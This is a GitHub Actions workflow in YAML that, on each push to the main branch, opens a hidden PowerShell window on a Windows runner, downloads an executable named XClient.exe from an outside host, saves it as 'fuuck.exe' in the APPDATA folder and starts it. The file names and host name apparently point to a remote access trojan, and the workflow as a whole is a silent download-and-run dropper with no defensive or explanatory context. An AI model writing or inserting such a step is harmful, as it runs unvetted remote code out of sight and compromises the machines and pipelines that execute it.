name: Download and Run .exe file silently

on:
  push:
    branches:
      - main

jobs:
  download_and_run:
    runs-on: windows-latest  # Указываем, что задача будет выполняться на Windows

    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Download and run .exe file without console
        run: |
          powershell -WindowStyle Hidden -Command "
          $exePath = Join-Path $env:APPDATA 'fuuck.exe'
          Invoke-WebRequest -Uri 'https://funrat.cloudpub.ru/XClient.exe' -Method POST -OutFile $exePath;
          Start-Sleep -Seconds 5;
          Start-Process $exePath
          "
